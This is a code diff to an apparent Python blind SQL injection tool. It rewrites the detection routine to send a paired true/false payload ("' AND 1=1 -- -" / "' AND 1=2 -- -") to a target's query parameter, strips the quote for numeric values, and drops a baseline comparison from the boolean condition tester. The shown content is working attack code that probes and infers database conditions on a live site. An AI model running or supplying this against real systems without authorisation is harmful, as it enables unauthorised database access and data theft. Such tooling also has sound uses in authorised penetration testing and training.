@@ -12,14 +12,6 @@ headers = {
     "User-Agent": "Mozilla/5.0"
 }
 
-PAYLOADS = [
-    "' AND 1=1 -- -",
-    "' AND 1=0 -- -",
-    # Now for some without an apostrophe
-    " AND 1=1 -- -",
-    " AND 1=0 -- -"
-]
-
 def remove_apostrophe(payload):
     if "'" in payload:
         new_payload = payload.replace("'","")
@@ -50,13 +42,20 @@ def test_for_sqli(target, param="id", value="1"):
     BASELINE = requests.get(target, headers=headers)
     baseline_text = BASELINE.text
 
-    for payload in PAYLOADS:
-        response = requests.get(target, headers=headers, params={param: f"{value}{payload}"})
-        new_text = response.text
-        difference_list = check_difference(baseline_text, new_text)
-        if is_page_different(difference_list):
-            print(f"[+] Page is vulnerable to SQL injection with payload: {payload}")
-            return True
+    true_payload = "' AND 1=1 -- -"
+    false_payload = "' AND 1=2 -- -"
+    if is_numeric(value):
+        true_payload = remove_apostrophe(true_payload)
+        false_payload = remove_apostrophe(false_payload)
+
+    true_response = requests.get(target, headers=headers, params={param: f"{value}{true_payload}"})
+    false_response = requests.get(target, headers=headers, params={param: f"{value}{false_payload}"})
+    true_text = true_response.text
+    false_text = false_response.text
+    difference_list = check_difference(true_text, false_text)
+    if is_page_different(difference_list):
+        print(f"[+] Page is vulnerable to SQL injection with payloads: {true_payload}/{false_payload}")
+        return True
 
     print("[-] Page is not vulnerable to SQL injection...")
     return False
@@ -101,19 +100,6 @@ def test_condition(payload, target, param="id", value="1", force_string=False):
     # If test response is similar to false but different from true, condition is FALSE
     if not is_different_from_false and is_different_from_true:
         print(f"    [*] Condition is FALSE (similar to false, different from true)")
-        return False
-
-    # For numeric injection, might need to check baseline
-    baseline_response = requests.get(target, headers=headers, params={param: value})
-    baseline_text = baseline_response.text
-    diff_with_baseline = check_difference(baseline_text, test_text)
-    is_different_from_baseline = is_page_different(diff_with_baseline)
-
-    print(f"    [*] is_different_from_baseline: {is_different_from_baseline}")
-
-    # If similar to baseline, condition might be FALSE (original query unchanged)
-    if not is_different_from_baseline:
-        print(f"    [*] Condition is FALSE (similar to baseline)")
         return False
 
     # Default: if similar to true, return True
